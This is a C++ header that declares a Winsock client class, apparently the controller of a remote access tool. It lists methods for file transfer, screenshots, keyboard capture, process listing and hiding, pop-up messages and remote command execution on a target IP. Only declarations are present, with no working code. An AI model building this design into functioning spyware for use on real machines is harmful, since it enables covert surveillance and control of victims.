
#ifndef CLIENT_H
#define CLIENT_H

#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>
#include <time.h>
#include <cstdio>
#include <ctime>
#include <stdlib.h>
#include <iostream>
#include "Shellapi.h"

#define BUFLEN 20004
#define IPLEN 20

#define HISTORY "_history.txt"
#pragma  comment(lib,"ws2_32.lib")



class client
{
public:
	client();
	~client();
	bool Tryconnect(const char* target_ip);
	void closeConnection();
	void getFilename(char *buf);
	bool getFile(const char* remotePath, const char* localPath);
	bool sendFile(const char* remotePath, const char* localPath);
	bool getScreenShot();
	bool getKeyBoard(char *recOper);
	bool getPSList(char *recOper);
	bool getUserName(char *recOper);
	bool processHide(const char *pid);
	bool popMessage(const char *message);
	bool sendCMD(const char &command, char *recOper);
	bool checkL();

	int send_s(const char *buf, int sendlen);
	int recv_s(char *buf, unsigned int buflen);

	static bool initWSA();
	static unsigned int readFileIntoBuf(FILE **fp, char *buf, unsigned int buflen);
	SOCKET sclient;
	char* target_ip;
};

#endif 